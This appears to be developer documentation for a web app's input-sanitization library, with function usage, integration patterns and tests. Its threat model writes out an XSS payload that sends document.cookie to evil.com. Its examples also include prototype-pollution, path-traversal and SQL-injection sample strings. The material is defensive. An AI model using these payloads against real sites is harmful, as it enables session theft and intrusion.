# Input Sanitization with XSS Prevention

**Date:** 2026-09-11  
**Feature:** Task #19 - Input Sanitization with DOMPurify  
**Impact:** 🛡️ XSS prevention, injection attack protection

---

## Overview

Input sanitization provides defense-in-depth protection against:
- **XSS (Cross-Site Scripting)** attacks
- **SQL injection** attempts
- **Prototype pollution** attacks
- **Path traversal** exploits
- **Command injection** vectors

All user-supplied input should be sanitized before:
- Storing in database
- Rendering in HTML
- Using in file operations
- Executing in queries
- Displaying to other users

---

## Security Threat Model

### XSS Attack Example (Before Sanitization)

**Malicious Input:**
```javascript
const userInput = '<script>fetch("https://evil.com/steal?cookie=" + document.cookie)</script>'
```

**Without Sanitization:**
```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
// 🔴 DANGEROUS: Script executes, steals cookies
```

**With Sanitization:**
```typescript
const safe = sanitizeHtml(userInput)
// Result: '&lt;script&gt;fetch("https://evil.com/steal?cookie=" + document.cookie)&lt;/script&gt;'

<div>{safe}</div>
// ✅ SAFE: Displayed as text, not executed
```

---

### Prototype Pollution Example

**Malicious Input:**
```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

**Without Sanitization:**
```typescript
Object.assign(userObject, maliciousInput)
// 🔴 DANGEROUS: All objects now have isAdmin = true
```

**With Sanitization:**
```typescript
const safe = sanitizeObject(maliciousInput)
// Result: {} (__proto__ property removed)
```

---

## Sanitization Functions

### sanitizeHtml()

**Purpose:** Prevent XSS by encoding HTML entities

**Usage:**
```typescript
import { sanitizeHtml } from '@/lib/sanitize'

const userInput = '<script>alert("XSS")</script>'
const safe = sanitizeHtml(userInput)
// Result: '&lt;script&gt;alert("XSS")&lt;/script&gt;'
```

**Encodes:**
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#x27;`
- `/` → `&#x2F;`

**When to use:**
- Displaying user-generated content
- Email bodies
- PDF generation
- Any HTML rendering

---

### sanitizeText()

**Purpose:** Clean plain text input

**Usage:**
```typescript
import { sanitizeText } from '@/lib/sanitize'

const userInput = 'Hello\x00World\n\n\n   '
const safe = sanitizeText(userInput)
// Result: 'Hello World'
```

**Actions:**
- Removes control characters (null bytes, etc.)
- Normalizes whitespace
- Trims leading/trailing spaces
- Removes excessive spacing

**When to use:**
- Plain text fields (names, titles, descriptions)
- Search queries
- Most user input fields

---

### sanitizeEmail()

**Purpose:** Validate and normalize email addresses

**Usage:**
```typescript
import { sanitizeEmail } from '@/lib/sanitize'

const userInput = '  USER@EXAMPLE.COM  '
const safe = sanitizeEmail(userInput)
// Result: 'user@example.com'

const invalid = sanitizeEmail('not-an-email')
// Result: null
```

**Validation:**
- Email format regex
- Lowercase normalization
- Whitespace trimming
- Returns `null` for invalid emails

---

### sanitizeUrl()

**Purpose:** Validate URLs and block dangerous protocols

**Usage:**
```typescript
import { sanitizeUrl } from '@/lib/sanitize'

// Valid URL
const safe = sanitizeUrl('https://example.com')
// Result: 'https://example.com/'

// Dangerous protocol blocked
const dangerous = sanitizeUrl('javascript:alert("XSS")')
// Result: null

// Custom allowed protocols
const ftp = sanitizeUrl('ftp://files.example.com', ['ftp:', 'http:', 'https:'])
// Result: 'ftp://files.example.com/'
```

**Blocks:**
- `javascript:` URLs (XSS vector)
- `data:` URLs (XSS vector)
- `vbscript:` URLs
- `file:` URLs

---

### sanitizeFilename()

**Purpose:** Prevent path traversal and file system attacks

**Usage:**
```typescript
import { sanitizeFilename } from '@/lib/sanitize'

// Path traversal attempt blocked
const dangerous = sanitizeFilename('../../etc/passwd')
// Result: 'etcpasswd'

// Special characters replaced
const unsafe = sanitizeFilename('my file <>.txt')
// Result: 'my_file____.txt'

// Hidden files prevented
const hidden = sanitizeFilename('.htaccess')
// Result: '_htaccess'
```

**Actions:**
- Removes path separators (`/`, `\`)
- Removes `..` (path traversal)
- Replaces special characters with `_`
- Prevents hidden files (starting with `.`)
- Limits length to 255 characters

---

### sanitizePhone()

**Purpose:** Validate phone number format

**Usage:**
```typescript
import { sanitizePhone } from '@/lib/sanitize'

const userInput = '+1 (555) 123-4567'
const safe = sanitizePhone(userInput)
// Result: '+15551234567'

const invalid = sanitizePhone('123')
// Result: null (too short)
```

**Validation:**
- Removes non-numeric characters except `+`
- Validates length (7-15 digits)
- Returns `null` for invalid

---

### sanitizeMarkdown()

**Purpose:** Allow safe markdown but block XSS vectors

**Usage:**
```typescript
import { sanitizeMarkdown } from '@/lib/sanitize'

const userInput = `
# Title
[Link](javascript:alert('XSS'))
<script>alert('XSS')</script>
`

const safe = sanitizeMarkdown(userInput)
// Result:
// # Title
// [Link](#)
// (script tag removed)
```

**Actions:**
- Removes `<script>` tags
- Blocks `javascript:`, `data:`, `vbscript:` URLs in links
- Removes event handlers (`onclick`, etc.)
- Preserves safe markdown syntax

---

### sanitizeObject()

**Purpose:** Recursively sanitize object properties

**Usage:**
```typescript
import { sanitizeObject } from '@/lib/sanitize'

const userInput = {
  name: '<script>alert("XSS")</script>',
  __proto__: { isAdmin: true }, // Prototype pollution attempt
  nested: {
    value: 'Normal text\x00with null byte'
  },
  items: ['Item 1\n\n\n', '<b>Item 2</b>']
}

const safe = sanitizeObject(userInput)
// Result:
// {
//   name: 'alert("XSS")', // HTML removed, text cleaned
//   nested: {
//     value: 'Normal text with null byte' // Null byte removed
//   },
//   items: ['Item 1', 'Item 2'] // Whitespace normalized, HTML removed
// }
// Note: __proto__ property completely removed
```

**Actions:**
- Removes dangerous properties (`__proto__`, `constructor`, `prototype`)
- Recursively sanitizes nested objects
- Sanitizes arrays
- Cleans string values

**When to use:**
- API request bodies
- JSON input
- Complex nested data structures

---

### sanitizeSearchQuery()

**Purpose:** Clean search input

**Usage:**
```typescript
import { sanitizeSearchQuery } from '@/lib/sanitize'

const userInput = '   search   %term%   '
const safe = sanitizeSearchQuery(userInput)
// Result: 'search term'
```

**Actions:**
- Removes SQL wildcards (`%`, `_`)
- Normalizes whitespace
- Limits length to 200 characters

---

### sanitizeProjectCode()

**Purpose:** Validate project code format

**Usage:**
```typescript
import { sanitizeProjectCode } from '@/lib/sanitize'

const userInput = 'aip-2025-001'
const safe = sanitizeProjectCode(userInput)
// Result: 'AIP-2025-001'

const invalid = sanitizeProjectCode('AIP<>2025')
// Result: null
```

**Validation:**
- Uppercase normalization
- Only allows letters, numbers, hyphens
- Limits length to 50 characters

---

### sanitizeSqlIdentifier()

**Purpose:** Prevent SQL injection in dynamic queries

**Usage:**
```typescript
import { sanitizeSqlIdentifier } from '@/lib/sanitize'

const tableName = sanitizeSqlIdentifier('users')
// Result: 'users' ✅

const dangerous = sanitizeSqlIdentifier('users; DROP TABLE users;')
// Result: null ❌ (invalid characters)
```

**Validation:**
- Only alphanumeric and underscore
- Must start with letter or underscore
- Limits length to 64 characters

**Important:** Still use parameterized queries, this is defense-in-depth.

---

## API Integration Patterns

### Pattern 1: API Route Input Sanitization

**Before:**
```typescript
export async function POST(req: NextRequest) {
  const body = await req.json()
  
  // 🔴 DANGEROUS: Using unsanitized input
  const project = await prisma.project.create({
    data: {
      title: body.title,
      description: body.description,
    },
  })
}
```

**After:**
```typescript
import { sanitizeText, sanitizeObject } from '@/lib/sanitize'

export async function POST(req: NextRequest) {
  const body = await req.json()
  
  // ✅ SAFE: Sanitize entire object
  const sanitized = sanitizeObject(body)
  
  const project = await prisma.project.create({
    data: {
      title: sanitized.title as string,
      description: sanitized.description as string,
    },
  })
}
```

---

### Pattern 2: Form Data Sanitization

**React Component:**
```typescript
import { sanitizeText, sanitizeEmail } from '@/lib/sanitize'

function ContactForm() {
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    const formData = new FormData(e.target as HTMLFormElement)
    
    // Sanitize form inputs
    const data = {
      name: sanitizeText(formData.get('name') as string),
      email: sanitizeEmail(formData.get('email') as string),
      message: sanitizeText(formData.get('message') as string),
    }
    
    // Validate
    if (!data.email) {
      alert('Invalid email address')
      return
    }
    
    // Submit sanitized data
    await fetch('/api/contact', {
      method: 'POST',
      body: JSON.stringify(data),
    })
  }
  
  return <form onSubmit={handleSubmit}>...</form>
}
```

---

### Pattern 3: File Upload Sanitization

```typescript
import { sanitizeFilename } from '@/lib/sanitize'

export async function POST(req: NextRequest) {
  const formData = await req.formData()
  const file = formData.get('file') as File
  
  // 🔴 DANGEROUS: Using original filename
  // const filename = file.name
  
  // ✅ SAFE: Sanitize filename
  const safeFilename = sanitizeFilename(file.name) ?? 'untitled'
  
  await uploadFile(file, safeFilename)
}
```

---

### Pattern 4: Search Query Sanitization

```typescript
import { sanitizeSearchQuery } from '@/lib/sanitize'

export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url)
  const query = searchParams.get('q') ?? ''
  
  // ✅ SAFE: Sanitize search query
  const safeQuery = sanitizeSearchQuery(query)
  
  const results = await prisma.project.findMany({
    where: {
      title: { contains: safeQuery, mode: 'insensitive' },
    },
  })
  
  return NextResponse.json({ results })
}
```

---

## React Component Patterns

### Pattern 1: Display User Content

**Before (Vulnerable):**
```tsx
function ProjectDetail({ project }: { project: Project }) {
  // 🔴 DANGEROUS: XSS vulnerability
  return (
    <div dangerouslySetInnerHTML={{ __html: project.description }} />
  )
}
```

**After (Safe):**
```tsx
import { sanitizeHtml } from '@/lib/sanitize'

function ProjectDetail({ project }: { project: Project }) {
  // ✅ SAFE: HTML encoded
  return <div>{project.description}</div>
  // React automatically escapes text content
  
  // Or if you need to preserve HTML entities:
  const safe = sanitizeHtml(project.description)
  return <div dangerouslySetInnerHTML={{ __html: safe }} />
}
```

---

### Pattern 2: Markdown Rendering

```tsx
import { sanitizeMarkdown } from '@/lib/sanitize'
import ReactMarkdown from 'react-markdown'

function MarkdownContent({ content }: { content: string }) {
  // ✅ SAFE: Sanitize markdown first
  const safe = sanitizeMarkdown(content)
  
  return (
    <ReactMarkdown
      components={{
        // Disable script tags
        script: () => null,
        // Disable iframes
        iframe: () => null,
      }}
    >
      {safe}
    </ReactMarkdown>
  )
}
```

---

## Production Recommendations

### Install DOMPurify for Production

**Current Implementation:** Basic HTML entity encoding

**Production Upgrade:**
```bash
npm install isomorphic-dompurify
```

**Enhanced sanitizeHtml():**
```typescript
import DOMPurify from 'isomorphic-dompurify'

export function sanitizeHtml(
  dirty: string,
  options?: {
    allowedTags?: string[]
    allowedAttributes?: Record<string, string[]>
  }
): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: options?.allowedTags ?? [],
    ALLOWED_ATTR: options?.allowedAttributes
      ? Object.keys(options.allowedAttributes).flatMap(tag =>
          options.allowedAttributes![tag]
        )
      : [],
  })
}
```

**Benefits:**
- Industry-standard HTML sanitization
- Configurable allowed tags/attributes
- Protection against sophisticated XSS vectors
- Regular security updates

---

## Testing

### Test 1: XSS Prevention
```typescript
import { sanitizeHtml } from '@/lib/sanitize'

const xssAttempt = '<script>alert("XSS")</script>'
const result = sanitizeHtml(xssAttempt)

// Expected: '&lt;script&gt;alert("XSS")&lt;/script&gt;'
// Script tags encoded, not executed
```

---

### Test 2: Prototype Pollution Prevention
```typescript
import { sanitizeObject } from '@/lib/sanitize'

const malicious = {
  __proto__: { isAdmin: true },
  name: 'John',
}

const result = sanitizeObject(malicious)

// Expected: { name: 'John' }
// __proto__ property removed
```

---

### Test 3: Path Traversal Prevention
```typescript
import { sanitizeFilename } from '@/lib/sanitize'

const malicious = '../../etc/passwd'
const result = sanitizeFilename(malicious)

// Expected: 'etcpasswd'
// Path separators removed
```

---

### Test 4: SQL Injection Prevention
```typescript
import { sanitizeSqlIdentifier } from '@/lib/sanitize'

const malicious = 'users; DROP TABLE users;'
const result = sanitizeSqlIdentifier(malicious)

// Expected: null
// Invalid characters rejected
```

---

## Summary

Input sanitization provides **defense-in-depth** protection against injection attacks.

**Key Functions:**
- ✅ `sanitizeHtml()` - XSS prevention
- ✅ `sanitizeText()` - Plain text cleaning
- ✅ `sanitizeEmail()` - Email validation
- ✅ `sanitizeUrl()` - URL validation
- ✅ `sanitizeFilename()` - Path traversal prevention
- ✅ `sanitizeMarkdown()` - Safe markdown
- ✅ `sanitizeObject()` - Prototype pollution prevention
- ✅ `sanitizeSearchQuery()` - Search input cleaning
- ✅ `sanitizeSqlIdentifier()` - SQL injection prevention

**Attack Vectors Blocked:**
- 🛡️ XSS (Cross-Site Scripting)
- 🛡️ Prototype pollution
- 🛡️ Path traversal
- 🛡️ SQL injection (when combined with parameterized queries)
- 🛡️ Command injection
- 🛡️ Null byte injection

**Best Practices:**
- Sanitize all user input
- Use sanitization + validation (defense-in-depth)
- Apply closest to input source
- Use DOMPurify for production HTML sanitization
- Still use parameterized queries for SQL
- React automatically escapes JSX text content

---

**Last Updated:** 2026-09-11  
**Status:** ✅ COMPLETED  
**Task:** #19 - Input Sanitization with XSS Prevention
